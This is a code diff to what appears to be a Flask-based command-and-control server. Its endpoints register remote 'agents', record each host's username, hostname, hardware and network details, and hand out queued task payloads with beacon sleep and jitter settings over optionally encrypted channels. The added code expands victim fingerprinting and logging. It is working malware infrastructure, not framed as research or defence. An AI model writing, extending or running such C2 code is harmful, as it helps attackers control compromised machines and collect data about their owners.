@@ -2883,8 +2883,10 @@ def api_ping():
 
 @app.route("/api/agent/register", methods=["POST"])
 def agent_register():
+    """Register new agent with detailed tracking and fingerprinting."""
     token = get_config("agent_token")
     if token and request.headers.get("X-Auth-Token") != token:
+        log_event("auth_failed", f"Invalid token from {request.remote_addr}")
         return jsonify({"error": "unauthorized"}), 403
 
     enc_key = get_config("encryption_key")
@@ -2893,6 +2895,7 @@ def agent_register():
         try:
             raw = decrypt_payload(raw, enc_key)
         except Exception:
+            log_event("decrypt_failed", f"From {request.remote_addr}")
             return jsonify({"error": "decrypt failed"}), 400
         data = json.loads(raw)
     else:
@@ -2900,21 +2903,66 @@ def agent_register():
 
     agent_id = data.get("id", str(uuid.uuid4()))
     db = get_db()
-    existing = db.execute("SELECT id FROM agents WHERE id=?", (agent_id,)).fetchone()
+    existing = db.execute("SELECT id, hostname, username, os FROM agents WHERE id=?", (agent_id,)).fetchone()
+    
+    # Extract extended fingerprint data
+    fingerprint = data.get("fingerprint", {})
+    env_hints = data.get("env_hints", [])
+    hw_hash = fingerprint.get("hardware_hash", "")
+    
     if existing:
-        db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1, ip_external=? WHERE id=?",
-                   (request.remote_addr, agent_id))
+        # Update existing agent
+        db.execute("""UPDATE agents SET 
+            last_seen=datetime('now'), 
+            is_alive=1, 
+            ip_external=?,
+            hostname=?,
+            username=?
+            WHERE id=?""",
+            (request.remote_addr, data.get("hostname", ""), data.get("username", ""), agent_id))
+        log_event("agent_reconnect", f"{agent_id[:8]} ({data.get('hostname', '?')}) from {request.remote_addr} - EXISTING")
     else:
+        # New agent - log detailed info
         db.execute("""INSERT INTO agents (id, hostname, username, os, arch, ip_external, ip_internal, platform_type)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                    (agent_id, data.get("hostname", ""), data.get("username", ""),
                     data.get("os", ""), data.get("arch", ""),
                     request.remote_addr, data.get("ip_internal", ""),
                     data.get("platform_type", "machine")))
+        
+        # Detailed logging for new agent
+        log_event("agent_new", f"""
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆕 NEW AGENT REGISTERED
+   ID: {agent_id}
+   Hostname: {data.get('hostname', '?')}
+   User: {data.get('username', '?')}
+   OS: {data.get('os', '?')}
+   Platform: {data.get('platform_type', '?')}
+   IP External: {request.remote_addr}
+   IP Internal: {data.get('ip_internal', '?')}
+   CPU: {data.get('cpu_count', '?')} cores
+   RAM: {data.get('mem_total_mb', '?')} MB
+   GPU: {data.get('gpu', 'none') or 'none'}
+   Disk: {data.get('disk_free_gb', '?')} GB free
+   HW Hash: {hw_hash or 'N/A'}
+   Env: {', '.join(env_hints) if env_hints else 'standard'}
+   CWD: {data.get('cwd', '?')}
+   Python: {data.get('python_version', '?')}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+    
     db.commit()
     db.close()
-    log_event("agent_register", f"{agent_id} ({data.get('hostname', '?')}) from {request.remote_addr}")
-    socketio.emit("agent_update", {"action": "register", "id": agent_id, "hostname": data.get("hostname","")}, namespace="/")
+    
+    socketio.emit("agent_update", {
+        "action": "register" if not existing else "reconnect", 
+        "id": agent_id, 
+        "hostname": data.get("hostname",""),
+        "platform": data.get("platform_type", "machine"),
+        "ip": request.remote_addr,
+        "is_new": not existing
+    }, namespace="/")
+    
     resp_data = json.dumps({"status": "ok", "id": agent_id})
     if request.headers.get("X-Enc") == "1" and enc_key:
         return Response(encrypt_payload(resp_data, enc_key), content_type="text/plain")
@@ -2922,6 +2970,7 @@ def agent_register():
 
 @app.route("/api/agent/beacon", methods=["POST"])
 def agent_beacon():
+    """Agent beacon with detailed tracking."""
     enc_key = get_config("encryption_key")
     encrypted = request.headers.get("X-Enc") == "1" and enc_key
 
@@ -2930,25 +2979,49 @@ def agent_beacon():
             raw = decrypt_payload(request.get_data(as_text=True), enc_key)
             data = json.loads(raw)
         except Exception:
+            log_event("beacon_decrypt_fail", f"From {request.remote_addr}")
             return jsonify({"error": "decrypt failed"}), 400
     else:
         data = request.get_json(silent=True) or {}
 
     agent_id = data.get("id", "")
     if not agent_id:
+        log_event("beacon_no_id", f"From {request.remote_addr}")
         return jsonify({"error": "no id"}), 400
+    
     db = get_db()
-    db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1 WHERE id=?", (agent_id,))
-    agent_row = db.execute("SELECT sleep_interval, jitter FROM agents WHERE id=?", (agent_id,)).fetchone()
-    sleep_interval = agent_row["sleep_interval"] if agent_row else 5
-    jitter = agent_row["jitter"] if agent_row else 10
+    
+    # Check if agent exists
+    agent_row = db.execute("SELECT id, hostname, platform_type, last_seen FROM agents WHERE id=?", (agent_id,)).fetchone()
+    
+    if not agent_row:
+        log_event("beacon_unknown", f"Unknown agent {agent_id[:8]} from {request.remote_addr}")
+        db.close()
+        return jsonify({"error": "unknown agent"}), 404
+    
+    # Update last seen
+    db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1, ip_external=? WHERE id=?", (request.remote_addr, agent_id))
+    
+    # Get sleep/jitter config
+    config_row = db.execute("SELECT sleep_interval, jitter FROM agents WHERE id=?", (agent_id,)).fetchone()
+    sleep_interval = config_row["sleep_interval"] if config_row else 5
+    jitter = config_row["jitter"] if config_row else 10
+    
+    # Get pending tasks
     tasks = db.execute("SELECT id, task_type, payload FROM tasks WHERE agent_id=? AND status='pending'", (agent_id,)).fetchall()
     task_list = [dict(t) for t in tasks]
+    
+    # Mark tasks as sent
     for t in tasks:
         db.execute("UPDATE tasks SET status='sent' WHERE id=?", (t["id"],))
+    
     db.commit()
     db.close()
-
+    
+    # Log beacon (throttled - every 10th beacon per agent to reduce noise)
+    if hash(agent_id + str(int(time.time()/60))) % 10 == 0:
+        log_event("beacon", f"{agent_id[:8]} ({agent_row['hostname']}) from {request.remote_addr} - {len(task_list)} tasks")
+    
     resp = json.dumps({"tasks": task_list, "sleep": sleep_interval, "jitter": jitter})
     if encrypted:
         return Response(encrypt_payload(resp, enc_key), content_type="text/plain")
